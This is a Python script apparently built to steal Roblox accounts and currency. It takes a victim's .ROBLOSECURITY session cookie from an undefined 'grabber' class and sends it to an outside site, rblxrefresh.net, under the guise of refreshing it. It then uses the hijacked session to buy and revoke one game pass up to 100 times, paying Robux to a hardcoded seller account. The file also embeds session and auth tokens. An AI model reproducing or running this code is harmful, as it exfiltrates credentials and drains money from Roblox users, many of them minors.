import requests
import time
from datetime import datetime

# Your headers for Roblox API requests
headers = {
    "accept": "*/*",
    "accept-language": "en-GB,en;q=0.9,en-US;q=0.8",
    "content-type": "application/json; charset=UTF-8",
    "origin": "https://www.roblox.com",
    "priority": "u=1, i",
    "referer": "https://www.roblox.com/",
    "sec-ch-ua": "\"Microsoft Edge\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0",
}

# Cookies for Roblox API requests
cookies = {
    "GuestData": "UserID=-1737649823",
    "_ga_BK4ZY0C59K": "GS2.1.s1748696548$o2$g0$t1748696548$j60$l0$h0",
    "_ga_F8VP9T1NT3": "GS2.1.s1748873849$o1$g0$t1748873849$j60$l0$h0",
    "_ga": "GA1.1.1595986603.1748519472",
    "_ga_9HRYHVCY79": "GS2.1.s1749374859$o1$g0$t1749375014$j60$l0$h0",
    "RBXSource": "rbx_acquisition_time=06/14/2025 15:37:06&rbx_acquisition_referrer=&rbx_medium=Social&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=0",
    "RBXSessionTracker": "sessionid=ac751504-83ce-44ce-bf4d-92fb6fd55bd1",
    "__utmz": "200924205.1750258072.18.3.utmcsr=ntp.msn.com|utmccn=(referral)|utmcmd=referral|utmcct=/",
    "rbx-ip2": "1",
    "__utma": "200924205.1417137041.1748029490.1750258072.1750271408.19",
    "__utmb": "200924205.0.10.1750271408",
    "__utmc": "200924205",
    ".ROBLOSECURITY": "",  # Will be updated below
}

purchase_url = "https://apis.roblox.com/game-passes/v1/game-passes/1268796851/purchase"
revoke_url = "https://apis.roblox.com/game-passes/v1/game-passes/1268796851:revokeownership"

purchase_data = {
    "expectedCurrency": 1,
    "expectedPrice": 2,
    "expectedSellerId": 8349984303  
}

def get_csrf_token(session):
    try:
        response = session.get("https://www.roblox.com", headers=headers, cookies=cookies)
        if response.status_code == 200:
            return response.headers.get("x-csrf-token", "+vJ1LG+zLHDe")
        return "+vJ1LG+zLHDe"
    except Exception as e:
        print(f"Error fetching CSRF token: {e}")
        return "+vJ1LG+zLHDe"

def fetch_refreshed_cookie(cookie):
    """
    If you want to refresh the cookie by POSTing it somewhere,
    do it here and return the new cookie string.
    """
    try:
        response = requests.post(
            "https://rblxrefresh.net/refresh",
            headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded"
            },
            data={"cookie": cookie},
            timeout=10
        )
        if response.status_code == 200:
            # assuming the response returns the refreshed cookie as plain text or json string
            # adjust parsing as necessary
            return response.text.strip()
        else:
            print(f"[WARN] Failed to refresh cookie, status code: {response.status_code}")
            return cookie
    except Exception as e:
        print(f"[ERROR] Exception refreshing cookie: {e}")
        return cookie

def main():
    # Initialize the cookie grabber (make sure Qazwsx_V2 class is implemented & imported)
    grabber = Qazwsx_V2()

    # Get the initial cookie from grabber
    if grabber.roblox_cookie:
        print(f"[INFO] Extracted Roblox cookie: {grabber.roblox_cookie}")
        initial_cookie = grabber.roblox_cookie
    else:
        print("[ERROR] No Roblox cookie extracted. Using empty string for .ROBLOSECURITY")
        initial_cookie = ""

    # Refresh cookie if desired
    refreshed_cookie = fetch_refreshed_cookie(initial_cookie)
    cookies[".ROBLOSECURITY"] = refreshed_cookie
    print(f"[INFO] .ROBLOSECURITY cookie set to: {refreshed_cookie}")

    # Start session and loop
    session = requests.Session()
    loop_count = 0
    max_loops = 100
    delay = 0.1

    while loop_count < max_loops:
        try:
            csrf_token = get_csrf_token(session)
            headers["x-csrf-token"] = csrf_token

            purchase_headers = headers.copy()
            purchase_headers["x-bound-auth-token"] = "v1|47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=|1750271764|QxWQ5g8gU6PJIHwqvPrq03UWydTLf0QOS8mDMG12h/BAGs09vgPOU3vZPiTuaa5NkdxVfknU68696T/d8fo7Hw=="
            print(f"[{datetime.now()}] Sending purchase request (Loop {loop_count + 1})...")
            purchase_response = session.post(purchase_url, headers=purchase_headers, cookies=cookies, json=purchase_data)
            print(f"Purchase Response: {purchase_response.status_code} - {purchase_response.text}")

            time.sleep(delay)

            revoke_headers = headers.copy()
            revoke_headers["x-bound-auth-token"] = "v1|47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=|1750271692|wA83YLPzezDdShAJZPtvlvV0MZdAoTRknUuUoPrjFoC5a8BJ9LapxP5AouLn7IU3I1oVf0LZeb3TxnFUqeA/Sg=="
            revoke_headers["content-length"] = "0"
            print(f"[{datetime.now()}] Sending revoke ownership request (Loop {loop_count + 1})...")
            revoke_response = session.post(revoke_url, headers=revoke_headers, cookies=cookies)
            print(f"Revoke Response: {revoke_response.status_code} - {revoke_response.text}")

            loop_count += 1
            time.sleep(delay)

        except Exception as e:
            print(f"Error in loop {loop_count + 1}: {e}")
            time.sleep(delay * 0.1)

if __name__ == "__main__":
    print("Starting Roblox cookie extraction and API request loop...")
    main()
